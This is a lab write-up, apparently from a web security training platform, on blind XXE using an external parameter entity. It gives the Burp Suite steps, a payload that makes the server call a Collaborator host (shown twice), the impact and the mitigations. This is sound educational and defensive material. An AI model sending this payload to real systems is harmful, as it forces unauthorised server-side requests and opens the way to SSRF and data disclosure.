# Lab Name

Blind XXE with out-of-band interaction via parameter entities

## Vulnerability

Blind XML External Entity (XXE) Injection

## Objective

Exploit a blind XXE vulnerability using an external parameter entity and confirm the server-side request through Burp Collaborator.

## Entry Point

Check Stock functionality

## Exploitation Type

Blind XXE / Out-of-Band (OAST) Detection / Parameter Entity

## Methodology

1. Visit a product page, click **Check stock**, intercept the resulting **POST** request in Burp Suite Professional, and send it to **Burp Repeater**.

2. Insert the following external parameter entity definition between the XML declaration and the `stockCheck` element. Right-click and select **Insert Collaborator Payload** to insert your Burp Collaborator subdomain:

```xml
<!DOCTYPE abc [<!ENTITY % xyz SYSTEM "http://oe6wcnwd4fn17w3rnkuqu89gk7qyep2e.oastify.com(BURP-COLLABORATOR)"> %xyz;]>
```

3. Send the modified request from **Burp Repeater**.

4. Go to the **Collaborator** tab and click **Poll now**.

5. If no interactions appear immediately, wait a few seconds and click **Poll now** again because the server-side request may be processed asynchronously.

6. Observe the **DNS and HTTP interactions** generated by the application.

7. These interactions confirm that the server processed the external parameter entity and made an out-of-band request to the Burp Collaborator domain.

## Payload Used

```xml
<!DOCTYPE abc [<!ENTITY % xyz SYSTEM "http://oe6wcnwd4fn17w3rnkuqu89gk7qyep2e.oastify.com(BURP-COLLABORATOR)"> %xyz; ]>
```

## Result

Successfully triggered a blind XXE vulnerability using an external parameter entity and confirmed the server-side interaction through DNS and HTTP requests received by Burp Collaborator.

## Impact

* Blind server-side requests
* Potential SSRF
* Internal network reconnaissance
* Possible access to internal services
* Potential sensitive information disclosure

## Mitigation

* Disable external entity processing in XML parsers.
* Disable DTD and parameter entity processing when not required.
* Use secure XML parser configurations.
* Restrict unnecessary outbound network connectivity.
* Monitor unexpected DNS and HTTP requests from application servers.

## Learning

Parameter entities provide another way to exploit XXE when a normal external entity does not produce a directly observable response. In this lab, the external parameter entity causes the XML parser to request the Burp Collaborator domain. The resulting DNS and HTTP interactions provide out-of-band confirmation that the XXE payload was successfully processed.
